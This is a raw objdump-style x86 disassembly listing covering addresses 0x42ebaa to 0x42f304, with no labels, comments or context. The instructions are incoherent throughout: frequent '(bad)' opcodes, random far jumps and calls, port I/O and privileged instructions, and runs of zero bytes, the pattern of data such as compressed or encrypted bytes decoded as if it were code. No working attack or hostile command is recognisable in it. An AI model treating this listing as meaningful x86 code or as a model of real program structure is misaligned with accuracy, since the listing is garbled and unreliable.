  42ebaa:	xor    edi,DWORD PTR [edx]
  42ebac:	clc    
  42ebad:	sbb    al,0x6e
  42ebaf:	sub    DWORD PTR [ebx+ebp*2+0x5e],edx
  42ebb3:	push   cs
  42ebb4:	loope  0x42ebea
  42ebb6:	bound  edx,QWORD PTR [edx]
  42ebb8:	xchg   DWORD PTR cs:[edx+0x4],esi
  42ebbc:	test   eax,0x2c6e393
  42ebc1:	dec    esp
  42ebc2:	test   al,0x4c
  42ebc4:	and    BYTE PTR [edx-0x4c],dl
  42ebc7:	push   cs
  42ebc8:	mov    ah,0xb8
  42ebca:	fstp   TBYTE PTR ds:0x9f
  42ebd0:	add    BYTE PTR [eax],al
  42ebd2:	test   al,0xe2
  42ebd4:	neg    BYTE PTR [ecx-0x13]
  42ebd7:	in     al,dx
  42ebd8:	jmp    0x42eb73
  42ebda:	jns    0x42eb8e
  42ebdc:	jmp    0x42ec52
  42ebde:	sbb    edi,DWORD PTR [ebx]
  42ebe0:	push   edx
  42ebe1:	in     eax,0x34
  42ebe3:	mov    edi,0xb253f76e
  42ebe8:	(bad)  
  42ebe9:	lods   eax,DWORD PTR ds:[esi]
  42ebea:	pop    es
  42ebeb:	aaa    
  42ebec:	push   edx
  42ebed:	int    0x63
  42ebef:	jmp    0x42ec52
  42ebf1:	icebp  
  42ebf2:	xor    al,0x62
  42ebf4:	adc    bh,BYTE PTR [esi+0x2904aa96]
  42ebfa:	xchg   esp,eax
  42ebfb:	jecxz  0x42ebc3
  42ebfd:	rcl    bl,cl
  42ebff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ec00:	dec    esp
  42ec01:	mov    al,0xd1
  42ec03:	mov    bl,0xe
  42ec05:	sahf   
  42ec06:	ja     0x42eb96
  42ec08:	adc    dl,BYTE PTR [esi+0x18ebba82]
  42ec0e:	nop
  42ec0f:	jmp    0x42ec12
  42ec11:	test   DWORD PTR [esi-0x2489f18e],ebx
  42ec17:	ror    dh,0x29
  42ec1a:	shl    BYTE PTR [ebx-0x640095f2],cl
  42ec20:	inc    esp
  42ec21:	mov    esi,0x66f6e308
  42ec26:	cs in  al,dx
  42ec28:	jmp    0x42ec97
  42ec2a:	push   ebx
  42ec2b:	arpl   WORD PTR [edx],bp
  42ec2d:	ret    
  42ec2e:	xor    BYTE PTR [eax],0xdd
  42ec31:	add    cl,al
  42ec33:	icebp  
  42ec34:	jmp    0x0:0xff
  42ec3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ec3c:	stos   DWORD PTR es:[di],eax
  42ec3e:	je     0x42ebd6
  42ec40:	imul   edx,DWORD PTR [edi+0x24],0x11a0de61
  42ec47:	mov    edx,0x2c74ea19
  42ec4c:	leave  
  42ec4d:	(bad)  
  42ec4e:	push   edi
  42ec4f:	xchg   edx,eax
  42ec50:	jmp    0x8347:0xaf13c03c
  42ec57:	xchg   ebx,eax
  42ec58:	mov    dh,0x17
  42ec5a:	inc    esp
  42ec5b:	outs   dx,BYTE PTR ds:[esi]
  42ec5c:	cmp    DWORD PTR ds:0xe8e79fff,0x15
  42ec63:	cmc    
  42ec64:	mov    ah,0x4e
  42ec66:	add    BYTE PTR [esi+ebp*8+0x62],bh
  42ec6a:	add    al,0x29
  42ec6c:	lods   eax,DWORD PTR ds:[esi]
  42ec6d:	repz arpl WORD PTR [ebx+edx*1+0x72ff3003],di
  42ec75:	push   cs
  42ec76:	mov    edx,DWORD PTR [edx+ecx*1+0x37f93ffe]
  42ec7d:	hlt    
  42ec7e:	and    DWORD PTR [edi+edi*8],0xbee90030
  42ec85:	adc    al,0x8b
  42ec87:	pop    es
  42ec88:	push   ss
  42ec89:	stos   BYTE PTR es:[edi],al
  42ec8a:	std    
  42ec8b:	adc    eax,DWORD PTR es:[ebx-0x1]
  42ec8f:	(bad)  
  42ec90:	adc    al,BYTE PTR [ebx]
  42ec92:	xor    BYTE PTR [edi-0x2ba2f18e],bh
  42ec98:	push   DWORD PTR [eax]
  42ec9a:	add    BYTE PTR [ecx+0xeb3cc9],bh
  42eca0:	add    BYTE PTR [eax],al
  42eca2:	add    BYTE PTR [eax],al
  42eca4:	scas   al,BYTE PTR es:[edi]
  42eca5:	dec    eax
  42eca6:	push   eax
  42eca7:	and    al,0xb1
  42eca9:	loop   0x42ed0d
  42ecab:	sbb    al,0xf6
  42ecad:	retf   0x4032
  42ecb0:	hlt    
  42ecb1:	jp     0x42ece5
  42ecb3:	or     al,0x90
  42ecb5:	jl     0x42ecbd
  42ecb7:	and    al,0xd0
  42ecb9:	push   eax
  42ecba:	ror    BYTE PTR [edi-0x6],0xb
  42ecbe:	mov    eax,0xfdb8c18
  42ecc3:	test   DWORD PTR [eax+0x28],edx
  42ecc6:	shl    esi,1
  42ecc8:	test   DWORD PTR [eax+0x2e],ebx
  42eccb:	and    al,0xac
  42eccd:	fild   DWORD PTR [ebx]
  42eccf:	mov    eax,ds:0x1bf44047
  42ecd4:	aas    
  42ecd5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ecd6:	les    edi,FWORD PTR [edi-0x3c6aea29]
  42ecdc:	jl     0x42ec77
  42ecde:	(bad)  
  42ecdf:	(bad)  
  42ece0:	mov    esi,0xbdff3a3c
  42ece5:	push   eax
  42ece6:	mov    DWORD PTR [ebp-0x78],esp
  42ece9:	pop    ebx
  42ecea:	das    
  42eceb:	or     eax,0x43ff7391
  42ecf0:	add    BYTE PTR [esi+edx*8],al
  42ecf3:	sti    
  42ecf4:	(bad)  
  42ecf5:	cld    
  42ecf6:	xchg   ebx,eax
  42ecf7:	mov    edi,0x8728a97c
  42ecfc:	fild   WORD PTR [ebx]
  42ecfe:	adc    bh,ch
  42ed00:	out    0x24,eax
  42ed02:	xchg   esp,eax
  42ed03:	mov    edi,0x539b9564
  42ed08:	add    BYTE PTR [eax],al
  42ed0a:	add    BYTE PTR [eax],al
  42ed0c:	add    BYTE PTR [edi+eax*1+0x589ab301],ch
  42ed13:	mov    bh,ch
  42ed15:	cmp    al,0xce
  42ed17:	cmp    DWORD PTR [eax],edx
  42ed19:	pop    eax
  42ed1a:	xor    BYTE PTR ds:0xeb1d02f,bl
  42ed20:	pop    edx
  42ed21:	adc    esi,DWORD PTR [ebx]
  42ed23:	jmp    0x20503932
  42ed28:	dec    esi
  42ed29:	lahf   
  42ed2a:	in     al,0x13
  42ed2c:	sti    
  42ed2d:	jge    0x42ed6a
  42ed2f:	out    0x3f,eax
  42ed31:	nop
  42ed32:	mov    dl,0x7a
  42ed34:	ret    
  42ed35:	cld    
  42ed36:	leave  
  42ed37:	jne    0x42ed5b
  42ed39:	lea    esi,[ebx+0x5e7af4ca]
  42ed3f:	adc    esp,esi
  42ed41:	push   0x5d
  42ed43:	stc    
  42ed44:	mov    ds:0x43c39a7c,al
  42ed49:	nop
  42ed4a:	das    
  42ed4b:	sbb    BYTE PTR ss:[edx+eiz*1-0x1a585109],cl
  42ed53:	jmp    0x4a8e:0xf572a1d3
  42ed5a:	cmp    DWORD PTR [esi],eax
  42ed5c:	stos   DWORD PTR es:[edi],eax
  42ed5d:	cmp    eax,0xc1a21ce6
  42ed62:	in     eax,0xca
  42ed64:	xlat   BYTE PTR ds:[ebx]
  42ed65:	xor    DWORD PTR [edx-0xb],0x8384dfd5
  42ed6c:	lds    ecx,FWORD PTR [edi+0x8e82b2]
  42ed72:	add    BYTE PTR [eax],al
  42ed74:	add    BYTE PTR [eax],al
  42ed76:	sti    
  42ed77:	xor    al,dl
  42ed79:	mov    BYTE PTR [edi],al
  42ed7b:	in     eax,0xf5
  42ed7d:	cmp    DWORD PTR [esi+0x64],esi
  42ed80:	jb     0x42edc9
  42ed82:	jbe    0x42eddc
  42ed84:	cmc    
  42ed85:	xor    edx,DWORD PTR [edi]
  42ed87:	jecxz  0x42ed46
  42ed89:	daa    
  42ed8a:	ds mov bl,0xf5
  42ed8d:	lea    ecx,[ecx-0x4a]
  42ed90:	js     0x42ed5a
  42ed92:	mov    ebx,edx
  42ed94:	mov    bh,0x9f
  42ed96:	retf   0xb4e4
  42ed99:	pop    ss
  42ed9a:	xchg   esp,eax
  42ed9b:	dec    esp
  42ed9c:	pop    esi
  42ed9d:	inc    edi
  42ed9e:	adc    BYTE PTR [eax+esi*2+0x47],cl
  42eda2:	mov    BYTE PTR [esi+esi*4-0x3c],cl
  42eda6:	xchg   edi,eax
  42eda7:	dec    esp
  42eda8:	pop    esi
  42eda9:	inc    edi
  42edaa:	es aaa 
  42edac:	xor    eax,DWORD PTR [edi+ecx*2-0x1b58f0c7]
  42edb3:	popf   
  42edb4:	jmp    0x42ee24
  42edb6:	xor    DWORD PTR [edx-0x4d6bd42b],ecx
  42edbc:	lea    ecx,[ebp+0x8]
  42edbf:	in     al,0xeb
  42edc1:	jmp    0xb6876b82
  42edc6:	mov    ebp,0x17461f68
  42edcb:	jo     0x42edff
  42edcd:	xlat   BYTE PTR ds:[ebx]
  42edce:	cwde   
  42edcf:	adc    BYTE PTR [edi+0x48c82410],0xe8
  42edd6:	xchg   ebx,eax
  42edd7:	sub    al,0x58
  42edd9:	cmc    
  42edda:	add    BYTE PTR [eax],al
  42eddc:	add    BYTE PTR [eax],al
  42edde:	add    BYTE PTR [eax+esi*8],cl
  42ede1:	sbb    dl,BYTE PTR [ecx]
  42ede3:	fwait
  42ede4:	in     eax,0xeb
  42ede6:	push   ss
  42ede7:	xlat   BYTE PTR ds:[ebx]
  42ede8:	xchg   ebx,eax
  42ede9:	popa   
  42edea:	jmp    0x41051982
  42edef:	sbb    al,0x91
  42edf1:	push   cs
  42edf2:	jmp    0xcd962760
  42edf7:	and    ecx,esp
  42edf9:	mov    DWORD PTR [edx+0x31],ebx
  42edfc:	jmp    0x2bfcc798
  42ee01:	fld    QWORD PTR [edi-0x2d]
  42ee04:	repnz push ss
  42ee06:	inc    ebx
  42ee07:	clc    
  42ee08:	ss push ebx
  42ee0a:	add    eax,0x359551e8
  42ee0f:	clc    
  42ee10:	sar    DWORD PTR [esi],0x72
  42ee13:	int3   
  42ee14:	retf   
  42ee15:	(bad)  
  42ee16:	mov    bh,0x30
  42ee18:	jmp    0x8fe997af
  42ee1d:	jmp    0x42ee1b
  42ee1f:	jecxz  0x42ede2
  42ee21:	dec    esi
  42ee22:	jmp    0xe9769205
  42ee27:	xchg   ebx,eax
  42ee28:	pop    ebp
  42ee29:	add    al,0x27
  42ee2b:	int    0xde
  42ee2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ee2e:	add    cl,cl
  42ee30:	(bad)  
  42ee32:	jmp    FWORD PTR [esi+0x6147de7a]
  42ee38:	iret   
  42ee39:	push   ebp
  42ee3a:	add    BYTE PTR [ecx-0x67],bh
  42ee3d:	and    edi,eax
  42ee3f:	imul   edx,DWORD PTR [edx+0x39],0xffffffc0
  42ee43:	add    BYTE PTR [eax],al
  42ee45:	add    BYTE PTR [eax],al
  42ee47:	add    dl,ah
  42ee49:	lods   eax,DWORD PTR ds:[esi]
  42ee4a:	sahf   
  42ee4b:	add    DWORD PTR [esi],edi
  42ee4d:	jno    0x42ee98
  42ee4f:	pop    ebx
  42ee50:	clc    
  42ee51:	jmp    0x42ede2
  42ee53:	add    BYTE PTR [ecx-0x51],bh
  42ee56:	lods   al,BYTE PTR ds:[esi]
  42ee57:	adc    BYTE PTR [ecx-0x64],ch
  42ee5a:	xchg   ebx,eax
  42ee5b:	in     al,dx
  42ee5c:	clc    
  42ee5d:	popf   
  42ee5e:	inc    eax
  42ee5f:	push   edi
  42ee60:	rcr    edx,1
  42ee62:	jmp    0x439:0xd9fe6eff
  42ee69:	mov    bh,0x95
  42ee6b:	inc    ebp
  42ee6c:	popf   
  42ee6d:	xor    al,0x53
  42ee6f:	cld    
  42ee70:	dec    esi
  42ee71:	imul   ebp,DWORD PTR [eax+edx*2-0xe94372],0xffffff98
  42ee79:	stos   DWORD PTR es:[edi],eax
  42ee7a:	out    0x15,eax
  42ee7c:	dec    ebp
  42ee7d:	jmp    0x47b4eead
  42ee82:	ins    DWORD PTR es:[edi],dx
  42ee83:	(bad)  
  42ee84:	out    dx,al
  42ee85:	leave  
  42ee86:	jne    0x42eebb
  42ee88:	out    0x9b,eax
  42ee8a:	inc    eax
  42ee8b:	push   edi
  42ee8c:	fsubp  st(0),st
  42ee8e:	jmp    0x42eea5
  42ee90:	mov    ecx,0x871474ae
  42ee95:	inc    ebx
  42ee96:	and    ebp,DWORD PTR [eax]
  42ee98:	push   0x7a
  42ee9a:	push   cs
  42ee9b:	push   DWORD PTR [esi+eax*8+0x39b9401c]
  42eea2:	lods   al,BYTE PTR ds:[esi]
  42eea3:	je     0x42ee68
  42eea5:	fwait
  42eea6:	xchg   ebx,eax
  42eea7:	enter  0xd821,0xe1
  42eeab:	inc    DWORD PTR [eax]
  42eead:	add    BYTE PTR [eax],al
  42eeaf:	add    BYTE PTR [eax],al
  42eeb1:	nop
  42eeb2:	cmp    al,0x98
  42eeb4:	out    dx,eax
  42eeb5:	adc    eax,0x3a1f073b
  42eeba:	clc    
  42eebb:	cwde   
  42eebc:	leave  
  42eebd:	test   al,0xc3
  42eebf:	xchg   edx,edi
  42eec1:	xchg   edi,eax
  42eec2:	push   esp
  42eec3:	shl    BYTE PTR [ebx-0x6c],cl
  42eec6:	push   esp
  42eec7:	aam    0xe6
  42eec9:	mov    dh,0x58
  42eecb:	in     eax,0x2f
  42eecd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eece:	or     edx,DWORD PTR [eax]
  42eed0:	xchg   DWORD PTR [esi+0x5e8712f5],ebx
  42eed6:	push   ebp
  42eed7:	stos   BYTE PTR es:[edi],al
  42eed8:	cli    
  42eed9:	add    BYTE PTR [edi+ebx*8+0x36148865],0xfe
  42eee1:	mov    esi,0xa5d3e5a8
  42eee6:	or     edx,DWORD PTR [eax]
  42eee8:	push   ebx
  42eee9:	inc    edi
  42eeea:	fucomip st,st(7)
  42eeec:	adc    eax,edx
  42eeee:	retf   
  42eeef:	and    bl,bh
  42eef1:	popf   
  42eef2:	jmp    ecx
  42eef4:	aas    
  42eef5:	nop
  42eef6:	cld    
  42eef7:	iret   
  42eef8:	pop    edx
  42eef9:	(bad)  
  42eefa:	adc    al,0xdb
  42eefc:	mov    ebp,0x35cb94
  42ef01:	pop    ss
  42ef02:	pusha  
  42ef03:	repz or ecx,DWORD PTR [edi]
  42ef06:	push   0x7b070bf3
  42ef0b:	push   ss
  42ef0c:	sti    
  42ef0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ef0e:	pop    ds
  42ef0f:	out    0x3f,eax
  42ef11:	nop
  42ef12:	or     eax,0x18
  42ef17:	add    BYTE PTR [eax],al
  42ef19:	add    BYTE PTR [ebp+0x54],al
  42ef1c:	mov    ebx,0x1fc7f47e
  42ef21:	push   edx
  42ef22:	or     esp,DWORD PTR [edi-0x58f4ad02]
  42ef28:	sbb    al,BYTE PTR [edi-0x78e20b17]
  42ef2e:	xchg   ebx,eax
  42ef2f:	mov    dl,0x2b
  42ef31:	aaa    
  42ef32:	pop    ss
  42ef33:	out    dx,al
  42ef34:	mov    WORD PTR [ebx],?
  42ef36:	mov    WORD PTR [edi],?
  42ef38:	mov    dh,0x1d
  42ef3a:	xchg   edx,eax
  42ef3b:	mov    ch,0x7d
  42ef3d:	jmp    0xe144:0x17d4cdb7
  42ef44:	ret    0x81d3
  42ef47:	jb     0x42ef3e
  42ef49:	loopne 0x42ef09
  42ef4b:	cdq    
  42ef4c:	cmc    
  42ef4d:	add    edi,ebp
  42ef4f:	test   BYTE PTR [eax+ebx*1-0x5c],dh
  42ef53:	das    
  42ef54:	mov    bl,0xb7
  42ef56:	out    dx,eax
  42ef57:	mov    ds:0x829003ca,al
  42ef5c:	iret   
  42ef5d:	in     al,0xe
  42ef5f:	in     eax,dx
  42ef60:	cmp    eax,0xf5b29079
  42ef65:	mov    BYTE PTR [edi],dl
  42ef67:	ficom  WORD PTR [di+0x6d4]
  42ef6c:	push   ss
  42ef6d:	sbb    BYTE PTR [ebp-0x3b504565],cl
  42ef73:	mov    ebx,0xb35c4803
  42ef78:	mov    DWORD PTR ds:0x31d5faf,eax
  42ef7e:	add    BYTE PTR [eax],al
  42ef80:	add    BYTE PTR [eax],al
  42ef82:	add    BYTE PTR [ebp-0x656a853c],bl
  42ef88:	or     al,0x26
  42ef8a:	add    al,0xbb
  42ef8c:	add    BYTE PTR [eax-0xa3db234],0x9e
  42ef93:	jl     0x42ef63
  42ef95:	ror    BYTE PTR [edx],0xfb
  42ef98:	data16 int 0xa9
  42ef9b:	mov    WORD PTR [edx+0x4a],cs
  42ef9e:	in     eax,0xef
  42efa0:	loopne 0x42ef7e
  42efa2:	mul    DWORD PTR [ebx-0x51fbca38]
  42efa8:	repnz shl BYTE PTR [esp+edi*1-0x7c3af0d3],0xca
  42efb1:	cmc    
  42efb2:	mov    dl,0x25
  42efb4:	fcomp  QWORD PTR [edi]
  42efb6:	mov    ebx,0x701685db
  42efbb:	dec    edi
  42efbc:	ficomp WORD PTR [ecx+0x52abf02c]
  42efc2:	stos   DWORD PTR es:[edi],eax
  42efc3:	pop    esp
  42efc4:	frstor [ecx-0xf]
  42efc7:	popa   
  42efc8:	frstor [ecx-0x27]
  42efcb:	hlt    
  42efcc:	sbb    dh,BYTE PTR gs:[esi-0x5d]
  42efd0:	mov    dh,0xeb
  42efd2:	aam    0xcf
  42efd4:	les    ecx,FWORD PTR [esi-0x17]
  42efd7:	dec    edx
  42efd8:	push   ds
  42efd9:	sbb    ebp,ecx
  42efdb:	test   eax,0x77ddebb2
  42efe0:	lods   al,BYTE PTR ds:[esi]
  42efe1:	jmp    0x42efb8
  42efe3:	outs   dx,DWORD PTR ds:[esi]
  42efe4:	lods   al,BYTE PTR ds:[esi]
  42efe5:	jmp    0x42ef9f
  42efe7:	add    BYTE PTR [eax],al
  42efe9:	add    BYTE PTR [eax],al
  42efeb:	add    BYTE PTR [edi+0x5e0501db],dl
  42eff1:	mov    al,ds:0xb29c2b0e
  42eff6:	(bad)  
  42eff7:	cmp    eax,0xbf417140
  42effc:	or     BYTE PTR [edx+esi*1-0x57],ah
  42f000:	jl     0x42f039
  42f002:	imul   ecx,ebp,0xffffffd3
  42f005:	aaa    
  42f006:	(bad)  
  42f007:	fs (bad) 
  42f009:	pop    ecx
  42f00a:	inc    ebp
  42f00b:	inc    esp
  42f00c:	xchg   esp,eax
  42f00d:	stos   BYTE PTR es:[edi],al
  42f00e:	push   cs
  42f00f:	jmp    0x2fdaa11c
  42f014:	jmp    0xcee10bff
  42f019:	outs   dx,DWORD PTR ds:[esi]
  42f01a:	inc    ebx
  42f01b:	jb     0x42efe5
  42f01d:	fadd   QWORD PTR [eax-0x13]
  42f020:	push   cs
  42f021:	and    BYTE PTR [ebp-0x11],ch
  42f024:	nop
  42f025:	fidiv  DWORD PTR [edi]
  42f027:	fnstcw WORD PTR [eax]
  42f029:	mov    ds:0x3da70062,al
  42f02e:	add    esi,DWORD PTR [eax]
  42f030:	mov    edi,0xca3d0e73
  42f035:	(bad)  
  42f036:	jmp    0x42f037
  42f038:	jl     0x42f0ad
  42f03a:	out    0x74,eax
  42f03c:	int    0x6f
  42f03e:	cdq    
  42f03f:	inc    esp
  42f040:	int    0xe7
  42f042:	call   0x93b2cdbb
  42f047:	retf   
  42f048:	imul   ecx,DWORD PTR [esp+ebp*8+0xeb352e7],0x0
  42f053:	add    BYTE PTR [eax],al
  42f055:	sub    al,0xf3
  42f057:	bound  esp,QWORD PTR [edi]
  42f059:	vmread DWORD PTR [edx],esi
  42f05c:	adc    BYTE PTR [ebx-0x39],bh
  42f05f:	adc    BYTE PTR [ecx],bh
  42f061:	sub    eax,0x797503d7
  42f066:	cmp    dh,bl
  42f068:	jg     0x42f07f
  42f06a:	or     DWORD PTR [esi],0x5f
  42f06d:	aaa    
  42f06e:	mov    al,ds:0xcfad8343
  42f073:	test   eax,0x603e6910
  42f078:	and    al,0x61
  42f07a:	add    esi,DWORD PTR ds:[edi+ebx*2]
  42f07e:	jae    0x42f08e
  42f080:	xor    ch,BYTE PTR [ecx+0xa]
  42f083:	hlt    
  42f084:	call   0x2c2ad2
  42f089:	jmp    0x316750cb
  42f08e:	mov    DWORD PTR [esi],ecx
  42f090:	call   FWORD PTR [ebp-0x6200fc29]
  42f096:	xlat   BYTE PTR ds:[ebx]
  42f097:	add    edi,edi
  42f099:	mov    BYTE PTR [edi-0x1acaea19],dh
  42f09f:	sub    eax,DWORD PTR [eax]
  42f0a1:	call   0x81aa:0xd6f86ced
  42f0a8:	rcl    BYTE PTR [eax+0x3d00170b],0x54
  42f0af:	mov    dh,0x7e
  42f0b1:	in     al,dx
  42f0b2:	les    esp,FWORD PTR [eax]
  42f0b4:	xchg   ecx,esp
  42f0b6:	add    eax,esp
  42f0b8:	cli    
  42f0b9:	add    BYTE PTR [eax],al
  42f0bb:	add    BYTE PTR [eax],al
  42f0bd:	add    BYTE PTR [ebp-0x6fc02227],ah
  42f0c3:	into   
  42f0c4:	les    esp,FWORD PTR [edx]
  42f0c6:	nop
  42f0c7:	leave  
  42f0c8:	inc    BYTE PTR [edi-0x49]
  42f0cb:	(bad)
  42f0ce:	push   ebp
  42f0cf:	sbb    eax,0xc98fd03b
  42f0d4:	(bad)  
  42f0d6:	sub    cl,bl
  42f0d8:	pushf  
  42f0d9:	leave  
  42f0da:	test   al,0x27
  42f0dc:	adc    BYTE PTR [eax],al
  42f0de:	nop
  42f0df:	dec    esi
  42f0e0:	shl    BYTE PTR [edi+esi*4+0x65],cl
  42f0e4:	dec    ebp
  42f0e5:	aam    0x92
  42f0e7:	dec    DWORD PTR [esi]
  42f0e9:	cmp    ebp,ecx
  42f0eb:	lahf   
  42f0ec:	std    
  42f0ed:	push   ss
  42f0ee:	sbb    edx,DWORD PTR [esi+0x50807487]
  42f0f4:	adc    bl,bh
  42f0f6:	in     eax,0xe7
  42f0f8:	mov    BYTE PTR [eax+ecx*4-0x64],dh
  42f0fc:	and    dl,BYTE PTR [eax]
  42f0fe:	adc    al,0x8c
  42f100:	(bad)  
  42f101:	mov    dh,0x0
  42f103:	retf   
  42f104:	and    eax,0xfe052c9
  42f109:	sti    
  42f10a:	mov    ebp,0x6414879f
  42f10f:	fisttp QWORD PTR [edi+0x0]
  42f112:	bound  ecx,QWORD PTR [ebx+0x60c5e9bb]
  42f118:	mov    dh,0x50
  42f11a:	sar    DWORD PTR [eax],0x1e
  42f11d:	push   ebx
  42f11e:	maxps  xmm2,XMMWORD PTR [edi]
  42f121:	xchg   DWORD PTR [eax],eax
  42f123:	add    BYTE PTR [eax],al
  42f125:	add    BYTE PTR [eax],al
  42f127:	jmp    0x843d7a44
  42f12c:	mov    dl,0xdd
  42f12e:	call   0xc7ef:0xf0ccb666
  42f135:	xor    eax,0x41f30d04
  42f13a:	or     al,0x5f
  42f13c:	in     al,dx
  42f13d:	aam    0xac
  42f13f:	or     eax,0x1703f5b3
  42f144:	jb     0x42f133
  42f146:	mov    WORD PTR [edx+ebx*8+0x70],cs
  42f14a:	inc    eax
  42f14b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42f14c:	and    esi,edi
  42f14e:	xor    bh,0x66
  42f151:	repnz mov WORD PTR [esi+ebx*8-0x7d],ss
  42f156:	les    ebx,FWORD PTR [edx+0x548cb724]
  42f15c:	stos   BYTE PTR es:[edi],al
  42f15d:	xchg   esp,eax
  42f15e:	adc    BYTE PTR [eax-0x1d63c4d1],al
  42f164:	add    DWORD PTR ds:0xc72a9c9b,0x43
  42f16b:	nop
  42f16c:	sub    DWORD PTR [esi-0x80],eax
  42f16f:	and    DWORD PTR [edi-0x14],0x70aee49a
  42f176:	into   
  42f177:	outs   dx,DWORD PTR ds:[esi]
  42f178:	pop    es
  42f179:	inc    eax
  42f17a:	call   0x2984:0xf36365a
  42f181:	mov    bl,0x7
  42f183:	mov    DWORD PTR [edx+0x770edfaa],ebx
  42f189:	in     eax,dx
  42f18a:	scas   al,BYTE PTR es:[edi]
  42f18b:	add    BYTE PTR [eax],al
  42f18d:	add    BYTE PTR [eax],al
  42f18f:	add    BYTE PTR [eax+0x31],ah
  42f192:	and    al,0x9a
  42f194:	cs mov eax,0x67909978
  42f19a:	cld    
  42f19b:	pop    edx
  42f19c:	inc    esi
  42f19d:	mov    cl,0xf5
  42f19f:	add    esi,DWORD PTR [edi]
  42f1a1:	lods   al,BYTE PTR ds:[esi]
  42f1a2:	dec    ebp
  42f1a3:	inc    edi
  42f1a4:	jae    0x42f158
  42f1a6:	cmc    
  42f1a7:	test   BYTE PTR [ecx],cl
  42f1a9:	mov    al,0xe
  42f1ab:	call   0xa55ea443
  42f1b0:	sbb    ebx,eax
  42f1b2:	pop    edi
  42f1b3:	stc    
  42f1b4:	sbb    BYTE PTR [esi+edx*1-0x22],cl
  42f1b8:	test   DWORD PTR [esi-0x3f6c0315],esi
  42f1be:	dec    esi
  42f1bf:	jmp    0xc6bc0f22
  42f1c4:	xchg   esp,eax
  42f1c5:	test   eax,0xd84fb951
  42f1ca:	(bad)  
  42f1cb:	out    dx,al
  42f1cc:	sbb    cl,0x1
  42f1cf:	cmc    
  42f1d0:	rcr    DWORD PTR [esi+ecx*1+0x4cf30546],0x42
  42f1d8:	fistp  DWORD PTR [esi]
  42f1da:	(bad)  
  42f1db:	call   0x6b3e2756
  42f1e0:	call   0x5ede1191
  42f1e5:	ins    BYTE PTR es:[edi],dx
  42f1e6:	cdq    
  42f1e7:	and    al,0x28
  42f1e9:	ins    BYTE PTR es:[edi],dx
  42f1ea:	inc    eax
  42f1eb:	sbb    esi,DWORD PTR [esi+0x242499ae]
  42f1f1:	ins    BYTE PTR es:[edi],dx
  42f1f2:	jbe    0x42f1e1
  42f1f4:	add    BYTE PTR [eax],al
  42f1f6:	add    BYTE PTR [eax],al
  42f1f8:	add    BYTE PTR [ebx+0x50b886b2],dl
  42f1fe:	ja     0x42f1de
  42f200:	call   0x2651a498
  42f205:	lahf   
  42f206:	out    0xfe,al
  42f208:	or     eax,0xa4d3b28c
  42f20d:	sub    esi,DWORD PTR [eax+eax*1]
  42f210:	jmp    0x3544c9a8
  42f215:	das    
  42f216:	pushf  
  42f217:	push   cs
  42f218:	push   ds
  42f219:	hlt    
  42f21a:	(bad)  
  42f21b:	into   
  42f21c:	test   eax,0xe9171e5a
  42f221:	jbe    0x42f256
  42f223:	sti    
  42f224:	mov    eax,0x1fb66d
  42f229:	jnp    0x42f25e
  42f22b:	push   ebx
  42f22c:	cld    
  42f22d:	sub    DWORD PTR [esi+0x5c],esi
  42f230:	push   0xfffffff7
  42f232:	mov    al,ds:0x3aed5595
  42f237:	add    eax,DWORD PTR [edi+esi*8]
  42f23a:	outs   dx,DWORD PTR ds:[esi]
  42f23b:	push   cs
  42f23c:	not    ecx
  42f23e:	fisubr WORD PTR [ebx-0x2208cfc0]
  42f244:	add    eax,0x503629
  42f249:	call   0xa69933f4
  42f24e:	sub    al,0xc7
  42f250:	jne    0x42f219
  42f252:	jns    0x42f2b7
  42f254:	xor    BYTE PTR [ebp-0x4a],0x40
  42f258:	push   DWORD PTR [edi+edi*1+0x401a]
  42f25f:	add    BYTE PTR [eax],al
  42f261:	add    BYTE PTR [ecx+0x3bc01341],bh
  42f267:	fwait
  42f268:	push   cs
  42f269:	add    DWORD PTR [esp+ebx*8+0x3a14eef3],eax
  42f270:	jmp    0xfdee2bf9
  42f275:	jg     0x42f2e3
  42f277:	out    dx,eax
  42f278:	imul   eax,DWORD PTR [ecx+ebp*2-0x50],0x35a505cf
  42f280:	push   eax
  42f281:	add    BYTE PTR [esi+eax*4+0x3a270029],ch
  42f288:	add    ebp,eax
  42f28a:	pop    ebx
  42f28b:	outs   dx,DWORD PTR ds:[esi]
  42f28c:	push   cs
  42f28d:	mov    ah,BYTE PTR [edx-0x7106e7f9]
  42f293:	cmp    dl,BYTE PTR [ebp+0x2bccd535]
  42f299:	add    BYTE PTR [ebx-0x4f],dl
  42f29c:	cmp    ebx,ebx
  42f29e:	jmp    0xbe39:0xe653e42d
  42f2a5:	mov    edx,DWORD PTR [eax-0x55eec64f]
  42f2ab:	(bad)  
  42f2ac:	push   ds
  42f2ad:	sti    
  42f2ae:	ds pusha 
  42f2b0:	xchg   DWORD PTR [esi+0xd],edi
  42f2b3:	fcomp  QWORD PTR [eax*1+0x7483e413]
  42f2ba:	xchg   edx,eax
  42f2bb:	pop    ss
  42f2bc:	stos   DWORD PTR es:[edi],eax
  42f2bd:	xchg   BYTE PTR [ebp-0x6fc00357],bh
  42f2c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42f2c4:	adc    ecx,0x0
  42f2c7:	add    BYTE PTR [eax],al
  42f2c9:	add    BYTE PTR [eax],al
  42f2cb:	aas    
  42f2cc:	add    al,0xbd
  42f2ce:	test   ebx,edx
  42f2d0:	mov    esp,DWORD PTR [ebx*2-0x4cebf7c5]
  42f2d7:	xchg   ecx,eax
  42f2d8:	dec    eax
  42f2d9:	mov    bh,ch
  42f2db:	cmp    al,0xcf
  42f2dd:	sar    BYTE PTR [edi+0x7b0ea210],0x87
  42f2e4:	pop    ebp
  42f2e5:	sar    BYTE PTR [esi+0x74fc1113],cl
  42f2eb:	mov    ch,BYTE PTR [edi-0x2eae731e]
  42f2f1:	pop    ds
  42f2f2:	push   0x52682c
  42f2f7:	(bad)  
  42f2f8:	dec    DWORD PTR [ebx]
  42f2fa:	adc    dl,al
  42f2fc:	retf   
  42f2fd:	nop
  42f2fe:	ret    
  42f2ff:	mov    WORD PTR [eax-0x56],fs
  42f302:	push   ss
  42f303:	push   eax
  42f304:	or     al,0xd1
